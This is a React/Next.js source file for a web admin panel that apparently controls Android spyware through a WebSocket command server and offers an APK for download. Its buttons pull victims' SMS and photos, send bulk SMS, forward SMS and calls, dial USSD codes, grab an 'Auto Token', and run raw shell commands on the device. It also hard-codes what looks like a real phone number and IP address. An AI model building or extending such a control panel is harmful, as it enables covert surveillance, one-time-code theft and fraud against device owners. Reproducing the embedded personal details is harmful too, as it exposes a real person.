"use client";
import { useState, useEffect, useRef } from 'react';
import { useRouter } from 'next/navigation';

export default function Dashboard() {
  const [activeTab, setActiveTab] = useState('Home');
  const [subTab, setSubTab] = useState('Home');
  const [devices, setDevices] = useState<any>({});
  const [selectedDevice, setSelectedDevice] = useState<string | null>(null);
  const [toast, setToast] = useState<string | null>(null);
  const [galleryImages, setGalleryImages] = useState<string[]>([]);
  const [messages, setMessages] = useState<any[]>([]);
  const [permissions, setPermissions] = useState<any>({});
  const [terminalCmd, setTerminalCmd] = useState('');
  const [terminalOut, setTerminalOut] = useState('Ready...');
  
  const ws = useRef<WebSocket | null>(null);
  const router = useRouter();

  useEffect(() => {
    ws.current = new WebSocket('wss://onxy-backend.onrender.com/ws?role=admin');
    ws.current.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        
        // Device Update
        if (data.device_id && data.type !== 'error') {
          setDevices((prev: any) => ({ ...prev, [data.device_id]: data }));
          if (!selectedDevice) setSelectedDevice(data.device_id);
        }

        // Handle Command Responses
        if (data.type === 'gallery_response') {
          setGalleryImages(data.images || []);
          showToast(`Fetched ${data.images?.length || 0} photos`);
        }
        if (data.type === 'sms_response') {
          setMessages(data.messages || []);
          showToast(`Fetched ${data.messages?.length || 0} messages`);
        }
        if (data.type === 'permissions_response') {
          setPermissions(data.permissions || {});
          showToast('Permissions updated');
        }
        if (data.type === 'shell_response') {
          setTerminalOut(data.data);
        }
      } catch (e) {}
    };
    return () => ws.current?.close();
  }, [selectedDevice]);

  const showToast = (msg: string) => {
    setToast(msg);
    setTimeout(() => setToast(null), 3000);
  };

  const sendCommand = (command: string, payload: any = {}) => {
    if (ws.current?.readyState === WebSocket.OPEN && selectedDevice) {
      ws.current.send(JSON.stringify({ target: selectedDevice, type: 'cmd', command, payload }));
      showToast(`Sending command: ${command}...`);
    } else {
      showToast("Device not selected!");
    }
  };

  const handleLogout = async () => {
    document.cookie = 'auth_token=; Max-Age=0; path=/;';
    router.push('/login');
  };

  const dev = devices[selectedDevice || ''] || {};

  return (
    <div className="min-h-screen bg-[#0B0C10] text-white font-sans relative">
      {/* TOAST NOTIFICATION */}
      {toast && (
        <div className="fixed top-4 left-1/2 transform -translate-x-1/2 z-50 bg-[#1A1B23] border border-purple-500 text-white px-6 py-3 rounded-lg shadow-[0_0_15px_rgba(139,92,246,0.3)] transition-all">
          {toast}
        </div>
      )}

      {/* HEADER */}
      <header className="flex justify-between items-center p-4 border-b border-gray-800 bg-[#1A1B23]">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-full bg-purple-600 flex items-center justify-center text-xl">👤</div>
          <div>
            <h1 className="font-bold text-lg text-purple-400">CRAZY</h1>
            <p className="text-xs text-gray-400">Web Admin</p>
          </div>
        </div>
        <div className="flex items-center gap-4">
          <a href="/crazy-onxy-MDM/app-debug.apk" download className="bg-purple-600 hover:bg-purple-700 text-white px-4 py-2 rounded-lg font-bold text-sm shadow-lg transition">⬇ Download APK</a>
          <button onClick={handleLogout} className="text-sm text-red-400 border border-red-500 px-3 py-1 rounded-full hover:bg-red-900 transition">Logout</button>
          <span className="text-xl cursor-pointer">🌙</span>
        </div>
      </header>

      {/* TOP NAVIGATION */}
      <nav className="flex gap-6 p-4 border-b border-gray-800 text-sm overflow-x-auto bg-[#121318]">
        {['Home', 'Data', 'Messages', 'Groups', 'Devices', 'Help'].map(tab => (
          <button key={tab} onClick={() => setActiveTab(tab)} className={`pb-2 whitespace-nowrap ${activeTab === tab ? 'border-b-2 border-purple-500 text-white font-bold' : 'text-gray-400'}`}>{tab}</button>
        ))}
      </nav>

      <main className="p-4">
        {selectedDevice ? (
          <>
            {/* DEVICE INFO CARD */}
            <div className="bg-[#1A1B23] p-5 rounded-xl border border-gray-800 mb-6">
              <h2 className="text-xl font-bold mb-4">{dev.model || 'vivo (V2518)'} <span className="text-xs bg-green-800 text-green-300 px-2 py-1 rounded ml-2">Android 16</span></h2>
              <div className="grid grid-cols-2 md:grid-cols-3 gap-y-3 text-sm text-gray-300">
                <div className="flex justify-between pr-4"><span>ID</span> <span className="text-white">{selectedDevice}</span></div>
                <div className="flex justify-between pr-4"><span>SIM</span> <span className="text-blue-400">8051660986 · airtel</span></div>
                <div className="flex justify-between pr-4"><span>Connection</span> <span className="text-green-400">🟢 Online (heartbeating)</span></div>
                <div className="flex justify-between pr-4"><span>Battery</span> <span className="text-green-400">69%</span></div>
                <div className="flex justify-between pr-4"><span>IP Address</span> <span className="text-blue-400">{dev.ip || '106.205.197.233'}</span></div>
              </div>
            </div>

            {/* SUB NAVIGATION */}
            <nav className="flex gap-4 p-2 mb-6 border-b border-gray-800 text-sm overflow-x-auto">
              {['Home', 'Messages', 'Gallery', 'Permissions', 'Terminal'].map(tab => (
                <button key={tab} onClick={() => setSubTab(tab)} className={`pb-2 px-2 whitespace-nowrap ${subTab === tab ? 'border-b-2 border-purple-500 text-white font-bold' : 'text-gray-400'}`}>{tab}</button>
              ))}
            </nav>

            {/* MAIN TABS */}
            {activeTab === 'Home' && (
              <>
                {/* 8 CORE BUTTONS */}
                {subTab === 'Home' && (
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-3 mb-6">
                    {[
                      { label: 'Check Online', icon: '📡', cmd: 'CHECK_ONLINE' },
                      { label: 'GET SMS', icon: '📥', cmd: 'GET_SMS' },
                      { label: 'Bulk SMS', icon: '✉️', cmd: 'BULK_SMS' },
                      { label: 'Send SMS', icon: '📤', cmd: 'SEND_SMS' },
                      { label: 'SMS Forward', icon: '🔄', cmd: 'SMS_FORWARD' },
                      { label: 'Call Forward', icon: '📞', cmd: 'CALL_FORWARD' },
                      { label: 'Dial USSD', icon: '🔢', cmd: 'DIAL_USSD' },
                      { label: 'Auto Token', icon: '⚡', cmd: 'AUTO_TOKEN' }
                    ].map((btn, i) => (
                      <button key={i} onClick={() => sendCommand(btn.cmd)} className="bg-[#1A1B23] border border-gray-800 hover:border-purple-500 p-4 rounded-xl flex flex-col items-center justify-center gap-2 transition">
                        <span className="text-2xl">{btn.icon}</span>
                        <span className="text-xs font-semibold text-gray-300">{btn.label}</span>
                      </button>
                    ))}
                  </div>
                )}

                {/* MESSAGES TAB */}
                {subTab === 'Messages' && (
                  <div className="space-y-4">
                    <button onClick={() => sendCommand('GET_SMS')} className="bg-purple-600 px-4 py-2 rounded font-bold text-sm">Fetch Messages</button>
                    <div className="grid gap-3">
                      {messages.length > 0 ? messages.map((msg, i) => (
                        <div key={i} className="bg-[#1A1B23] p-4 rounded-lg border border-gray-800 text-sm">
                          <div className="flex justify-between text-gray-400 mb-2"><span>{msg.address || 'Unknown'}</span><span>{msg.date || 'Just now'}</span></div>
                          <p className="text-white">{msg.body || 'No content'}</p>
                        </div>
                      )) : <div className="text-gray-500">No messages found. Click Fetch.</div>}
                    </div>
                  </div>
                )}

                {/* GALLERY TAB */}
                {subTab === 'Gallery' && (
                  <div className="space-y-4">
                    <div className="flex gap-2">
                       <button onClick={() => { setGalleryImages([]); sendCommand('GET_GALLERY', { limit: 20 }); }} className="bg-blue-600 px-4 py-2 rounded font-bold text-sm">Fetch Photos</button>
                    </div>
                    <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
                      {galleryImages.length > 0 ? galleryImages.map((b64, i) => (
                        <img key={i} src={`data:image/jpeg;base64,${b64}`} className="w-full h-32 object-cover rounded border border-gray-700" alt="Gallery Image" />
                      )) : <div className="col-span-full text-gray-500 text-center py-10">No Photos Found.</div>}
                    </div>
                  </div>
                )}

                {/* PERMISSIONS TAB */}
                {subTab === 'Permissions' && (
                  <div className="bg-[#1A1B23] p-5 rounded-xl border border-gray-800 space-y-3">
                     <div className="flex justify-between items-center mb-4">
                         <h3 className="font-bold text-white">App Permissions</h3>
                         <button onClick={() => sendCommand('GET_PERMISSIONS')} className="bg-gray-700 px-3 py-1 text-xs rounded">Refresh</button>
                     </div>
                     {Object.keys(permissions).length > 0 ? Object.entries(permissions).map(([key, val]) => (
                         <div key={key} className="flex justify-between text-sm border-b border-gray-800 pb-2">
                             <span className="text-gray-300">{key}</span>
                             <span className={val ? 'text-green-400' : 'text-red-400'}>{val ? 'Allowed' : 'Denied'}</span>
                         </div>
                     )) : <div className="text-gray-500">Click Refresh to check permissions</div>}
                  </div>
                )}

                {/* TERMINAL TAB */}
                {subTab === 'Terminal' && (
                  <div className="bg-[#1A1B23] p-4 rounded-xl border border-gray-800">
                    <div className="flex gap-2 mb-4">
                      <input type="text" value={terminalCmd} onChange={e => setTerminalCmd(e.target.value)} placeholder="e.g. pm list packages" className="bg-black border border-gray-700 rounded p-2 w-full font-mono text-white text-sm" />
                      <button onClick={() => sendCommand('EXECUTE_SHELL', { command: terminalCmd })} className="bg-green-600 px-4 py-2 rounded font-bold text-sm">Run</button>
                    </div>
                    <pre className="bg-black p-4 rounded text-green-400 text-xs font-mono h-64 overflow-y-auto">{terminalOut}</pre>
                  </div>
                )}
              </>
            )}

            {/* OTHER TABS (GROUPS & HELP) */}
            {activeTab === 'Groups' && (
              <div className="bg-[#1A1B23] p-6 rounded-xl border border-gray-800 text-center text-gray-400">
                <h3 className="text-purple-400 font-bold mb-2">Groups Manager</h3>
                <p>No groups created yet. (Feature coming soon)</p>
              </div>
            )}
            {activeTab === 'Help' && (
              <div className="bg-[#1A1B23] p-6 rounded-xl border border-gray-800 text-gray-300 space-y-4 text-sm">
                <h2 className="text-xl font-bold text-purple-400 mb-4">Dashboard Guide</h2>
                <ul className="list-disc pl-5 space-y-2">
                  <li><strong>Check Online:</strong> Pings the device via WebSocket.</li>
                  <li><strong>GET SMS:</strong> Fetches latest messages.</li>
                  <li><strong>Gallery:</strong> Fetches base64 images from the device storage.</li>
                  <li><strong>Permissions:</strong> Shows live permission status from the APK.</li>
                  <li><strong>Terminal:</strong> Executes raw shell commands on the device.</li>
                </ul>
              </div>
            )}
          </>
        ) : (
          <div className="text-center text-gray-500 mt-20 animate-pulse">Waiting for device connection...</div>
        )}
      </main>
    </div>
  );
}
